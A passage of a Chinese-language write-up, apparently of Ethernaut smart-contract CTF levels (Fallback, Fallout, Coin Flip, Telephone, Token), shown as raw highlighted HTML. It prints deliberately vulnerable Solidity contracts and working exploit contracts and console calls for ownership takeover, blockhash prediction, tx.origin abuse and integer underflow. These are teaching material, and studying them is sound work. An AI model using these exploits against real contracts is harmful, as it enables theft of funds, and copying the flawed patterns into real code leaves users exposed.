class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> contributions<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">getContribution</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>    owner<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逐步分析，在合约的构造函数中将合约的部署者设置成了函数的owner并且设定了其贡献值为1000eth，如果走contribute函数来获取owner权限的话需要超过1000eth的贡献，而每次的贡献又需要小于0.001eth，这显然是不现实的，所以我们看向receive函数，在这里只要我们向receive函数携带eth，并且我们有贡献值就能拿到owner权限，最后再使用withdraw将合约剩余代币转出即可</p><ul><li>contract.contribute({value:1})</li><li>contract.sendTransaction({value:1})</li><li>contract.withdraw()</li></ul>        <h2 id="FallOut"   >          <a href="#FallOut" class="heading-link"><i class="fas fa-link"></i></a><a href="#FallOut" class="headerlink" title="FallOut"></a>FallOut</h2>      <pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Fallout</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> allocations<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token comment">/* constructor */</span>  <span class="token keyword">function</span> <span class="token function">Fal1out</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    allocations<span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">modifier</span> onlyOwner <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>            msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span>            <span class="token string">"caller is not the owner"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">allocate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">sendAllocation</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> allocator<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    allocator<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">collectAllocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>    msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">allocatorBalance</span><span class="token punctuation">(</span><span class="token builtin">address</span> allocator<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这很白痴是吧? 真实世界的合约必须安全的多, 难以入侵的多, 对吧?</p><p>实际上… 也未必.</p><p>Rubixi的故事在以太坊生态中非常知名. 这个公司把名字从 ‘Dynamic Pyramid’ 改成 ‘Rubixi’ 但是不知道怎么地, 他们没有把合约的 constructor 方法也一起更名:</p><pre class="line-numbers language-none"><code class="language-none">contract Rubixi &#123;  address private owner;  function DynamicPyramid() &#123; owner &#x3D; msg.sender; &#125;  function collectAllFees() &#123; owner.transfer(this.balance) &#125;  ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这让攻击者可以调用旧合约的constructor 然后获得合约的控制权, 然后再获得一些资产. 是的. 这些重大错误在智能合约的世界是有可能的.</p></blockquote><p>就这没错</p>        <h2 id="Coin-Flip"   >          <a href="#Coin-Flip" class="heading-link"><i class="fas fa-link"></i></a><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2>      <blockquote><p>这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。</p><p>这可能能帮助到你</p><ul><li>查看上面的帮助页面，“控制台之外” 部分</li></ul></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> lastHash<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//回滚</span>    <span class="token punctuation">&#125;</span>    lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue<span class="token punctuation">.</span><span class="token function">div</span><span class="token punctuation">(</span>FACTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看代码定义的三个数字consecutiveWins，lastHash，FACTOR，分别是我们获胜的次数，最后一次区块的哈希，还有2的255次方</p><p>再看后面整个对硬币反转做判断的函数内容，首先是让blockValue值为前一个区块，并且进行判断如果此次猜测和上次猜测的区块相同就回滚整个过程，如果不是就继续下面内容</p><p>首先将此次的区块内容存储，并且让coinFilp的值为blockValue/FACTOR，此处由于自动取整，并且FACTOR值为2^255，所以结果非1即0，可以看到整个过程随机结果的产生完全依靠于上一个区块，所以我们只需要先本地执行一遍算法计算出coinFlip的值就能保证我们每次都“猜”到结果，区块大约为10秒一个，所以直接使用手撸复制猜测是不现实，我们可以再写一个合约部署到相同的区块链上来攻击该链</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> lastHash<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue<span class="token operator">/</span>FACTOR<span class="token punctuation">;</span>    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">exploit</span> <span class="token punctuation">&#123;</span>  CoinFlip expFlip<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token builtin">address</span> aimAddr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    expFlip <span class="token operator">=</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span>aimAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">(</span>blockValue<span class="token punctuation">)</span> <span class="token operator">/</span> FACTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bool</span> guess <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    expFlip<span class="token punctuation">.</span><span class="token function">flip</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Remix IDE中通过Metamask部署到题目的区块链上，进行10次hack攻击即可</p><blockquote><p>通过solidity产生随机数没有那么容易. 目前没有一个很自然的方法来做到这一点, 而且你在智能合约中做的所有事情都是公开可见的, 包括本地变量和被标记为私有的状态变量. 矿工可以控制 blockhashes, 时间戳, 或是是否包括某个交易, 这可以让他们根据他们目的来左右这些事情.</p><p>想要获得密码学上的随机数,你可以使用 <span class="exturl"><a class="exturl__link"   href="https://docs.chain.link/docs/get-a-random-number" >Chainlink VRF</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>, 它使用预言机, LINK token, 和一个链上合约来检验这是不是真的是一个随机数.</p><p>一些其它的选项包括使用比特币block headers (通过验证 <span class="exturl"><a class="exturl__link"   href="http://btcrelay.org/" >BTC Relay</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>), <span class="exturl"><a class="exturl__link"   href="https://github.com/randao/randao" >RANDAO</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>, 或是 <span class="exturl"><a class="exturl__link"   href="http://www.oraclize.it/" >Oraclize</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>).</p></blockquote>        <h2 id="Telephone"   >          <a href="#Telephone" class="heading-link"><i class="fas fa-link"></i></a><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2>      <pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Telephone</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接看<code>tx.origin</code>和<code>msg.sender</code>的区别</p><p><strong>msg.sender:</strong> 指直接调用智能合约功能的帐户或智能合约的地址<br><strong>tx.origin:</strong> 指调用智能合约功能的账户地址，只有账户地址可以是tx.origin</p><p><img src="https://img.learnblockchain.cn/attachments/2022/02/XyJFUGH5620dcb1e08bda.jpg"></p><p>我们开一个新合约直接传入我们自己的address通过新合约调用Telephone合约即可</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Telephone</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">hh</span><span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> ow<span class="token operator">=</span><span class="token number">0xeeD53DF0B7E5CF4272a2E92c4E39B1405910d8C7</span><span class="token punctuation">;</span>    Telephone exp<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        exp<span class="token operator">=</span><span class="token function">Telephone</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        exp<span class="token punctuation">.</span><span class="token function">changeOwner</span><span class="token punctuation">(</span>ow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这个例子比较简单, 混淆 <code>tx.origin</code> 和 <code>msg.sender</code> 会导致 phishing-style 攻击, 比如<span class="exturl"><a class="exturl__link"   href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/" >this</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.</p><p>下面描述了一个可能的攻击.</p><ol><li>使用 <code>tx.origin</code> 来决定转移谁的token, 比如.</li></ol><pre class="line-numbers language-none"><code class="language-none">function transfer(address _to, uint _value) &#123;  tokens[tx.origin] -&#x3D; _value;  tokens[_to] +&#x3D; _value;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>攻击者通过调用合约的 transfer 函数是受害者向恶意合约转移资产, 比如</li></ol><pre class="line-numbers language-none"><code class="language-none">function () payable &#123;  token.transfer(attackerAddress, 10000);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>在这个情况下, <code>tx.origin</code> 是受害者的地址 ( <code>msg.sender</code> 是恶意协议的地址), 这会导致受害者的资产被转移到攻击者的手上.</li></ol></blockquote>        <h2 id="Token"   >          <a href="#Token" class="heading-link"><i class="fas fa-link"></i></a><a href="#Token" class="headerlink" title="Token"></a>Token</h2>      <blockquote><p>这一关的目标是攻破下面这个基础 token 合约</p><p>你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好</p><p> 这可能有帮助:</p><ul><li>什么是 odometer?</li></ul></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Token</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> balances<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> totalSupply<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _initialSupply<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> totalSupply <span class="token operator">=</span> _initialSupply<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _value <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _value<span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">+=</span> _value<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_owner<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看代码，balances映射的相当是我们的token个数，初始为20个，再看transfer函数，要求我们的token数减去交易数要大于等于0，但是问题是token数和交易数都是uint类型，恒大于等于0（因为运算结果也是uint类型），所以require根本不需要绕过，如果我们将<code>_value</code>值设定为21，就会出现溢出，导致我们的balance极大，也就完成了任务</p><pre class="line-numbers language-none"><code class="language-none">contract.transfer(instance,21)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Overflow 在 solidity 中非常常见, 你必须小心检查, 比如下面这样:</p><pre class="line-numbers language-none"><code class="language-none">if(a + c &gt; a) &#123;  a &#x3D; a + c;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>另一个简单的方法是使用 OpenZeppelin 的 SafeMath 库, 它会自动检查所有数学运算的溢出, 可以像这样使用:</p><pre class="line-numbers language-none"><code class="language-none">a &#x3D; a.add(c);<span aria-hidden="true" 